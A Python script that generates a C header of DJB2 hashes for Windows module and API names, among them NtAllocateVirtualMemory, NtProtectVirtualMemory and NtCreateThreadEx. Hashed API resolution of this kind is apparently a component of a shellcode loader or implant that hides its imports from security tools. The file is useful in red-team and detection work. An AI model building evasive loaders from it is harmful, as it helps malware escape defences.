import os

def djb2_hash(string, is_wide=False):
    h = 5381
    for char in string:
        val = ord(char.lower() if is_wide else char)
        h = ((h << 5) + h) + val
    return h & 0xFFFFFFFF

with open("Hashes.h", "w") as f:
    f.write("/* auto generated */\n")
    f.write("#pragma once\n\n")

    f.write("/* MODULE HASHES */\n")
    f.write(f"#define HASH_MOD_NTDLL 0x{djb2_hash('ntdll.dll', is_wide=True):08x}\n")
    f.write(f"#define HASH_MOD_KERNEL32 0x{djb2_hash('kernel32.dll', is_wide=True):08x}\n")
    f.write(f"#define HASH_MOD_KERNELBASE 0x{djb2_hash('kernelbase.dll', is_wide=True):08x}\n")

    f.write("\n/* API HASHES */\n")
    # ntdll
    f.write(f"#define HASH_FN_NtAllocateVirtualMemory 0x{djb2_hash('NtAllocateVirtualMemory'):08x}\n")
    f.write(f"#define HASH_FN_NtProtectVirtualMemory  0x{djb2_hash('NtProtectVirtualMemory'):08x}\n")
    f.write(f"#define HASH_FN_NtCreateThreadEx        0x{djb2_hash('NtCreateThreadEx'):08x}\n")

    #kernel32
    f.write(f"#define HASH_FN_GetTickCount            0x{djb2_hash('GetTickCount'):08x}\n")
    #kernelbase
    f.write(f"#define HASH_FN_GetCurrentProcessId     0x{djb2_hash('GetCurrentProcessId'):08x}\n")
    f.write(f"#define HASH_FN_WaitForSingleObject     0x{djb2_hash('WaitForSingleObject'):08x}\n")
